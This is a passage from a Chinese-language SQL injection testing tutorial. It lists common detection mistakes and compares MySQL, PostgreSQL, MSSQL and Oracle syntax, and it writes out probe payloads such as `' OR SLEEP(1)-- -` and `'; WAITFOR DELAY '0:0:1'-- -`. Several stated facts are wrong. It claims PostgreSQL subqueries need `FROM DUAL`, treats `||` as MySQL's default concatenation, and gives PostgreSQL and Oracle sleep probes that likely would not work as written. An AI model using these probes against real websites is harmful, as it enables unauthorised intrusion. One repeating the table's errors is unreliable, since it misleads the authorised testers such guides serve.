## 6. 常见错误与纠正

### 错误 1：只用 `OR 1=1`，不用 `AND 1=2`

**问题**：只测恒真条件。如果原查询返回的数据本身就是"全部"（如 `SELECT * FROM news` 无 WHERE 条件），`OR 1=1` 不会产生任何差异。

**纠正**：恒真 + 恒假必须成对测试。两者都与原始响应对比，形成三态对比。

### 错误 2：`AND SLEEP(5)` 零延迟就判断无注入

**问题**：短路求值导致 SLEEP 不被执行。

**纠正**：先 `OR SLEEP`, 无延迟再试 `AND SLEEP`。永远不要仅凭一个方向的延迟测试下结论。

### 错误 3：在 LIKE 场景使用自平衡闭合

**问题**：尾部的 `%` 被带入了字符串比较中，`'1'='1%'` 不相等。

**纠正**：LIKE 场景必须用注释符处理尾部 `%`。

### 错误 4：假设所有注入点都是 GET 参数

**问题**：POST 参数、Cookie、HTTP Header（User-Agent、Referer、X-Forwarded-For）等也可能是注入点。这些位置同样会被拼入 SQL（如日志记录、统计分析）。

**纠正**：对每个数据入口点都执行探测流程。

### 错误 5：看到报错就直接上 UNION/报错注入提取数据

**问题**：报错只告诉你"这里有语法错误"，不告诉你"我已经成功注入了"。如果闭合方式不对，再复杂的注入语句也不会生效。

**纠正**：先闭合（消除报错），再确认（恒真/恒假对比），最后才考虑数据提取。

### 错误 6：忽略编码问题

**问题**：在 GET 请求中直接将 payload 拼接到 URL 而不做 URL 编码。例如空格必须编码为 `%20` 或 `+`，`#` 必须编码为 `%23`（否则浏览器当作锚点）。

**纠正**：GET 请求的 payload 需要 URL 编码。关键字符的编码：

| 字符 | URL 编码 |
|------|---------|
| 空格 | `%20` 或 `+` |
| `#` | `%23` |
| `'` | `%27` |
| `"` | `%22` |
| `--` | `--` (通常不需要编码) |
| `=` | `%3d`（可选，通常不需要） |

POST 请求不需要 URL 编码（但需要根据 Content-Type 决定编码方式）。

## 7. 不同数据库的差异

虽然本文档主要针对 MySQL（PHP 最常见的搭配），但在其他数据库中，探测思路相同，只需替换相应的函数和语法。

| | MySQL | PostgreSQL | MSSQL | Oracle |
|---|-------|------------|-------|--------|
| 字符串连接 | `CONCAT()` 或 `||` | `\|\|` | `+` | `\|\|` |
| 延迟函数 | `SLEEP(n)` | `pg_sleep(n)` | `WAITFOR DELAY '0:0:n'` | `DBMS_LOCK.SLEEP(n)` |
| 行注释 | `-- ` 或 `#` | `-- ` | `-- ` | `-- ` |
| 字符串定界符 | `'` 或 `"`（默认） | `'` 仅单引号 | `'` 仅单引号 | `'` 仅单引号 |
| 子查询要求 | 不需要 FROM | 必须 `FROM DUAL` 或任意表 | 不需要 FROM | 必须 `FROM DUAL` |

**时间探测在不同数据库的写法**：
```
MySQL:      ' OR SLEEP(1)-- -
PostgreSQL: ' OR pg_sleep(1)-- -
MSSQL:      '; WAITFOR DELAY '0:0:1'-- -
Oracle:     ' OR DBMS_LOCK.SLEEP(1)-- -
```

如果 MySQL 的时间探测无响应，不一定是没有注入，可能数据库是 PostgreSQL 或其他 — 需要在探测前确认数据库类型（通过报错信息、指纹识别等方式）。
